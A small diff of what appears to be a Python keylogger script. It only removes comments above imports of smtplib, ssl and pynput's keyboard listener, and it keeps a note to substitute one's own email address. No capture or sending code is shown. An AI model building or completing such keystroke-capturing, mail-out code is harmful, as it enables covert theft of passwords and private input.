@@ -1,10 +1,8 @@
 
-
-# Defines an SMTP client session object to send mail to any internet machine with an SMTP or ESMTP listener daemon
 import smtplib
-# Provides access to TLS/SSL encryption and peer authentication facilities for network sockets
+
 import ssl
-# Allows the control and monitoring of input devices (mouse and keyboard)
+
 from pynput import keyboard
 
 # Replace user@domain.com with your email id (everywhere)
